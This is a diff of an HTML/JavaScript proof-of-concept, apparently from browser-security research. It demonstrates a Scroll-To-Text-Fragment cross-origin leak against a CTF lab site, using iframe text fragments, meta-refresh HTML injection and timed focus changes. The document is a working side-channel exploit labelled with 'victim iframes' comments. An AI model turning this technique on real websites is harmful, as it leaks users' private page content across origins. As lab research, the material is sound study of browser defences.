@@ -1,9 +1,24 @@
 <!DOCTYPE HTML>
 <body>
     <div id=inpp ></div>
+<!-- setting up victim iframes -->
 <iframe id=asdf src="https://ctf.s1r1us.ninja/lab/#message:~:text=ABC"  height=150px width=290px></iframe>
-<iframe id=asdf src="https://ctf.s1r1us.ninja/lab/#message:~:text==133"  height=150px width=290px></iframe>
-<iframe id=asdf src="https://ctf.s1r1us.ninja/lab/#message:~:text==337"  height=150px width=290px></iframe>
+<iframe id=asdf src="https://ctf.s1r1us.ninja/lab/#message:~:text=133"  height=150px width=290px></iframe>
+<iframe id=asdf src="https://ctf.s1r1us.ninja/lab/#message:~:text=337"  height=150px width=290px></iframe>
+<iframe id=asdf src="https://ctf.s1r1us.ninja/lab/#message:~:text=ABC"  height=150px width=290px></iframe>
+
+<ol>
+<li>
+frame 1:  html injection in same origin
+</li><li>
+frame 2:  without any injection
+</li><li>
+frame 3:  html injection in subdomain(same-site)
+</li><li>
+frame 4:  html injection in same origin different fragment
+</li>
+</ol>
+
 <script>
 
 var  inp = document.createElement('input')
@@ -21,13 +36,22 @@ setTimeout(function(){
     document.getElementById('inp').focus();
 },1000);
 window.onload = ()=>{inp.focus();}
+
+/* using redirect to go to victim site  */
+
 setTimeout( ()=> {
     frames[0].location=url+ encodeURIComponent(`<html><meta http-equiv="refresh" content="0;https://ctf.s1r1us.ninja/lab/#message">`);
-    frames[1].location=url+ encodeURIComponent(`<html><meta http-equiv="refresh" content="0;https://ctf.s1r1us.ninja/lab/#message">`);
-    //frames[2].location=url+ encodeURIComponent(`<html><meta http-equiv="refresh" content="0;https://ctf.s1r1us.ninja/lab/#message">`);
-	frames[2].location = "https://ctf.s1r1us.ninja/lab/#message";
+    //frames[1].location=url+ encodeURIComponent(`<html><meta http-equiv="refresh" content="0;https://ctf.s1r1us.ninja/lab/#message">`);
+    frames[2].location='https://notctf.s1r1us.ninja/lab/info.php?cb='+ encodeURIComponent(`<html><meta http-equiv="refresh" content="0;https://ctf.s1r1us.ninja/lab/#message">`);
+	frames[1].location = "https://ctf.s1r1us.ninja/lab/#message";
+frames[3].location=url+ encodeURIComponent(`<html><meta http-equiv="refresh" content="0;https://ctf.s1r1us.ninja/lab/#message">`);
 	console.log('changing focus');
 },2000);
+
+
+
+/*  focus to top input */
+
 setTimeout( () => {
 	       console.log('changing focus');
         var  inps = document.createElement('input')
@@ -40,17 +64,25 @@ setTimeout( () => {
 	document.getElementById('inpp').append(inps);
         location = 'https://msrkp.github.io/chrome/sttf_iframe.html#inps'
 },4000);
+
+/* changing focus to frames */
 setTimeout( () => {
 	frames[0].location = 'https://ctf.s1r1us.ninja/lab/#message'
     frames[1].location = 'https://ctf.s1r1us.ninja/lab/#message'
     frames[2].location = 'https://ctf.s1r1us.ninja/lab/#message'
+frames[3].location = 'https://ctf.s1r1us.ninja/lab/#message'
 },5000);
+
+
+/*  DO STTF */
 setTimeout(function(){
     frames[0].location = 'https://ctf.s1r1us.ninja/lab/#message:~:text=ABC';
     frames[1].location = 'https://ctf.s1r1us.ninja/lab/#message:~:text=133';
     frames[2].location = 'https://ctf.s1r1us.ninja/lab/#message:~:text=337';
-
+    frames[3].location = 'https://ctf.s1r1us.ninja/lab/#message:~:text=133';
 },6000)
+
+
 </script>
 </body>
 </html>
